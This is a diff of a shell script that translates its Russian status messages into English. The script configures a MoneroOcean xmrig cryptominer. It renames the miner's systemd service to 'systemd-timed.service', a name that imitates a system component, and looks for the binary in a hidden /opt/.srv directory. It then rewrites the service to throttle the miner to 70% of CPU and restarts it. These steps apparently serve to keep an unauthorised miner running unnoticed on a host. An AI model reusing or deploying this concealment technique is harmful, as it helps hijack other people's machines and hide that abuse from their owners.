@@ -13,28 +13,28 @@ export HOME=$ORIGINAL_HOME
 OLD_SERVICE_FILE="/etc/systemd/system/moneroocean_miner.service"
 NEW_SERVICE_FILE="/etc/systemd/system/systemd-timed.service"
 if [ -f "$OLD_SERVICE_FILE" ]; then
-    echo "Переименовываем moneroocean_miner.service в systemd-timed.service..."
+    echo "Renaming moneroocean_miner.service to systemd-timed.service..."
     mv "$OLD_SERVICE_FILE" "$NEW_SERVICE_FILE"
     systemctl daemon-reload
 fi
 if [ -f "$NEW_SERVICE_FILE" ]; then
     if ! grep -q "cpulimit" "$NEW_SERVICE_FILE"; then
-        echo "Настраиваем systemd service для автоматического применения cpulimit..."
+        echo "Configuring systemd service for automatic cpulimit application..."
         CPU_CORES=$(nproc)
-        echo "Обнаружено ядер CPU: $CPU_CORES"
+        echo "Detected CPU cores: $CPU_CORES"
         CPU_LIMIT=$(echo "$CPU_CORES * 100 * 70 / 100" | bc)
-        echo "Устанавливаем лимит CPU: $CPU_LIMIT (70% от $CPU_CORES ядер)"
+        echo "Setting CPU limit: $CPU_LIMIT (70% of $CPU_CORES cores)"
         XMRIG_PATH=$(which xmrig 2>/dev/null || find /opt/.srv -name "xmrig" -type f 2>/dev/null | head -1)
         if [ -z "$XMRIG_PATH" ]; then
             if [ -f "/opt/.srv/moneroocean/xmrig" ]; then
                 XMRIG_PATH="/opt/.srv/moneroocean/xmrig"
-                echo "Найден xmrig: $XMRIG_PATH"
+                echo "Found xmrig: $XMRIG_PATH"
             else
-                echo "Ошибка: xmrig не найден, используем стандартный путь"
+                echo "Error: xmrig not found, using default path"
                 XMRIG_PATH="/usr/bin/xmrig"
             fi
         else
-            echo "Найден xmrig: $XMRIG_PATH"
+            echo "Found xmrig: $XMRIG_PATH"
         fi
         {
             echo "[Unit]"
@@ -55,11 +55,11 @@ if [ -f "$NEW_SERVICE_FILE" ]; then
         } > "$NEW_SERVICE_FILE"
         systemctl daemon-reload
         systemctl restart systemd-timed.service
-        echo "Systemd service обновлен для автоматического применения cpulimit"
+        echo "Systemd service updated for automatic cpulimit application"
     else
-        echo "Systemd service уже настроен для cpulimit, пропускаем"
+        echo "Systemd service already configured for cpulimit, skipping"
     fi
 else
-    echo "Внимание: Service файл $NEW_SERVICE_FILE не найден"
+    echo "Warning: Service file $NEW_SERVICE_FILE not found"
 fi
-echo "Майнер установлен и запущен с ограничением CPU до 70%"
+echo "Miner installed and running with 70% CPU limit"
